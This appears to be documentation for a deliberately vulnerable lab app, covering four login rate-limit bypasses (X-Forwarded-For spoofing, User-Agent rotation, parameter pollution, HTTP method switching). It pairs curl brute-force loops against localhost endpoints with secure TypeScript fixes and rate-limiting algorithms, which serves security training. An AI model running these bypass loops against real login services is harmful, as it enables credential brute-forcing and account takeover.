# Rate Limiting Bypass Vulnerabilities

> [!WARNING]
> **HIGH SEVERITY VULNERABILITIES** - Based on security research and WAF bypass techniques. For educational purposes only.

## Overview

Implemented **4 rate limiting bypass techniques** based on security research and real-world attack patterns. These demonstrate how attackers can circumvent rate limiting to perform brute-force attacks.

---

## Vulnerabilities

### 1. Rate Limit Bypass via X-Forwarded-For Header

**Severity**: High  
**Source**: Security Research & HackerOne

**Vulnerability**: IP-based rate limiting trusts the X-Forwarded-For header without validation.

**Exploitation**:
```bash
# 1. Normal request gets rate limited after 5 attempts
for i in {1..5}; do
  curl -X POST http://localhost:3000/api/additional-auth/login-rate-limit-xff \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"wrong'$i'"}'
done
# Rate limited!

# 2. Bypass by changing X-Forwarded-For header
for ip in {1..255}; do
  curl -H "X-Forwarded-For: 192.168.1.$ip" \
    -X POST http://localhost:3000/api/additional-auth/login-rate-limit-xff \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"guess'$ip'"}'
done

# Each request appears from different IP - rate limit bypassed!
```

**Impact**: Unlimited brute-force attempts, credential stuffing.

**Secure Implementation**:
```typescript
export const loginSecure = async (req: Request, res: Response) => {
    // DON'T trust X-Forwarded-For without validation
    const ip = req.socket.remoteAddress; // Use actual socket IP
    
    // Or if behind proxy, validate X-Forwarded-For
    const xff = req.headers['x-forwarded-for'] as string;
    const trustedProxies = ['10.0.0.1', '10.0.0.2']; // Your load balancers
    
    let clientIP = req.socket.remoteAddress;
    if (trustedProxies.includes(clientIP) && xff) {
        clientIP = xff.split(',')[0].trim();
    }
    
    // Rate limit by actual IP
    if (rateLimitByIP[clientIP] >= 5) {
        return res.status(429).json({ message: 'Too many attempts' });
    }
};
```

---

### 2. Rate Limit Bypass via User-Agent Rotation

**Severity**: Medium  
**Source**: Security Research

**Vulnerability**: Rate limiting includes User-Agent header in the rate limit key.

**Exploitation**:
```bash
# 1. Create array of User-Agent strings
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
  "Mozilla/5.0 (X11; Linux x86_64)"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
)

# 2. Rotate User-Agent for each request
for i in {1..100}; do
  UA="${USER_AGENTS[$((i % 4))]}-$i"
  
  curl -H "User-Agent: $UA" \
    -X POST http://localhost:3000/api/additional-auth/login-rate-limit-ua \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"guess'$i'"}'
done

# Each unique User-Agent bypasses rate limit!
```

**Impact**: Extended brute-force window, credential testing.

**Secure Implementation**:
```typescript
export const loginSecure = async (req: Request, res: Response) => {
    const { email } = req.body;
    const ip = req.socket.remoteAddress;
    
    // Rate limit by email + IP, NOT User-Agent
    const key = `${email}-${ip}`;
    
    if (rateLimits[key] >= 5) {
        return res.status(429).json({ message: 'Too many attempts' });
    }
    
    // User-Agent should only be logged, not used for rate limiting
    console.log('User-Agent:', req.headers['user-agent']);
};
```

---

### 3. Rate Limit Bypass via Parameter Pollution

**Severity**: Medium  
**Source**: Security Research

**Vulnerability**: Rate limiting uses full URL including query parameters, making each URL unique.

**Exploitation**:
```bash
# 1. Add random query parameters to make each request unique
for i in {1..100}; do
  RAND=$RANDOM
  
  curl -X POST "http://localhost:3000/api/additional-auth/login-rate-limit-params?rand=$RAND&cache=$i" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"guess'$i'"}'
done

# Each URL is unique - rate limit bypassed!

# 2. Alternative: Add random body parameters
for i in {1..100}; do
  curl -X POST http://localhost:3000/api/additional-auth/login-rate-limit-params \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"guess'$i'","_rand":"'$RANDOM'"}'
done
```

**Impact**: Rate limit bypass, brute-force attacks.

**Secure Implementation**:
```typescript
export const loginSecure = async (req: Request, res: Response) => {
    const { email } = req.body;
    const ip = req.socket.remoteAddress;
    
    // Rate limit by email + IP, ignore URL parameters
    const key = `${email}-${ip}`;
    
    // Don't use req.originalUrl or query params in rate limit key
    if (rateLimits[key] >= 5) {
        return res.status(429).json({ message: 'Too many attempts' });
    }
    
    // Validate and reject unexpected parameters
    const allowedKeys = ['email', 'password'];
    const extraKeys = Object.keys(req.body).filter(k => !allowedKeys.includes(k));
    
    if (extraKeys.length > 0) {
        return res.status(400).json({ message: 'Invalid parameters' });
    }
};
```

---

### 4. Rate Limit Bypass via HTTP Method Switching

**Severity**: Medium  
**Source**: Security Research & WAF Bypass Techniques

**Vulnerability**: Rate limiting only applied to POST requests, not GET or other methods.

**Exploitation**:
```bash
# 1. POST requests are rate limited
for i in {1..5}; do
  curl -X POST http://localhost:3000/api/additional-auth/login-rate-limit-method \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"wrong'$i'"}'
done
# Rate limited after 5 attempts

# 2. Switch to GET with query parameters
for i in {6..100}; do
  curl -X GET "http://localhost:3000/api/additional-auth/login-rate-limit-method?email=victim@test.com&password=guess$i"
done
# Rate limit bypassed!

# 3. Or try other methods
curl -X PUT http://localhost:3000/api/additional-auth/login-rate-limit-method \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"test"}'
```

**Impact**: Rate limit bypass, credential brute-forcing.

**Secure Implementation**:
```typescript
// Apply rate limiting at middleware level for ALL methods
app.use('/api/auth/login', rateLimitMiddleware);

export const rateLimitMiddleware = (req: Request, res: Response, next: NextFunction) => {
    const email = req.body.email || req.query.email;
    const ip = req.socket.remoteAddress;
    const key = `${email}-${ip}`;
    
    // Rate limit regardless of HTTP method
    if (rateLimits[key] >= 5) {
        return res.status(429).json({ message: 'Too many attempts' });
    }
    
    rateLimits[key] = (rateLimits[key] || 0) + 1;
    next();
};

// Only allow POST for login
export const loginSecure = (req: Request, res: Response) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method not allowed' });
    }
    
    // Process login
};
```

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/additional-auth/login-rate-limit-xff` | POST | X-Forwarded-For bypass |
| `/api/additional-auth/login-rate-limit-ua` | POST | User-Agent rotation |
| `/api/additional-auth/login-rate-limit-params` | POST | Parameter pollution |
| `/api/additional-auth/login-rate-limit-method` | POST/GET | HTTP method switching |

---

## Testing Checklist

- [ ] Test X-Forwarded-For header manipulation
- [ ] Test User-Agent rotation bypass
- [ ] Test parameter pollution bypass
- [ ] Test HTTP method switching bypass

---

## Secure Implementation Best Practices

1. **IP-Based Rate Limiting**
   - Use actual socket IP, not headers
   - Validate X-Forwarded-For only from trusted proxies
   - Implement proxy chain validation
   - Log suspicious header manipulation

2. **Rate Limit Key Design**
   - Use email/username + IP address
   - Don't include User-Agent in key
   - Ignore URL query parameters
   - Normalize email addresses (lowercase)

3. **Method-Agnostic Protection**
   - Apply rate limiting at middleware level
   - Protect all HTTP methods equally
   - Explicitly allow only required methods
   - Return 405 Method Not Allowed for others

4. **Parameter Validation**
   - Whitelist allowed parameters
   - Reject unexpected parameters
   - Validate parameter types and formats
   - Log parameter pollution attempts

5. **Layered Defense**
   - Combine multiple rate limiting strategies:
     - Per-email rate limiting
     - Per-IP rate limiting
     - Global rate limiting
     - CAPTCHA after threshold
   - Use progressive delays (exponential backoff)
   - Implement account lockout after threshold

6. **Monitoring & Alerting**
   - Log all rate limit violations
   - Alert on suspicious patterns
   - Track bypass attempts
   - Implement automated blocking

---

## Advanced Rate Limiting Strategies

### 1. Token Bucket Algorithm
```typescript
class TokenBucket {
    private tokens: number;
    private lastRefill: number;
    
    constructor(
        private capacity: number,
        private refillRate: number // tokens per second
    ) {
        this.tokens = capacity;
        this.lastRefill = Date.now();
    }
    
    tryConsume(): boolean {
        this.refill();
        
        if (this.tokens >= 1) {
            this.tokens--;
            return true;
        }
        
        return false;
    }
    
    private refill() {
        const now = Date.now();
        const timePassed = (now - this.lastRefill) / 1000;
        const tokensToAdd = timePassed * this.refillRate;
        
        this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd);
        this.lastRefill = now;
    }
}
```

### 2. Sliding Window Rate Limiting
```typescript
const requestTimestamps: { [key: string]: number[] } = {};

export const slidingWindowRateLimit = (key: string, limit: number, windowMs: number): boolean => {
    const now = Date.now();
    const windowStart = now - windowMs;
    
    // Get timestamps within window
    if (!requestTimestamps[key]) {
        requestTimestamps[key] = [];
    }
    
    // Remove old timestamps
    requestTimestamps[key] = requestTimestamps[key].filter(ts => ts > windowStart);
    
    // Check limit
    if (requestTimestamps[key].length >= limit) {
        return false; // Rate limited
    }
    
    // Add current request
    requestTimestamps[key].push(now);
    return true; // Allowed
};
```

---

## References

- [OWASP Rate Limiting Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [X-Forwarded-For Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
- [Rate Limiting Algorithms](https://en.wikipedia.org/wiki/Rate_limiting)
- [WAF Bypass Techniques](https://owasp.org/www-community/attacks/Web_Application_Firewall_Evasion)
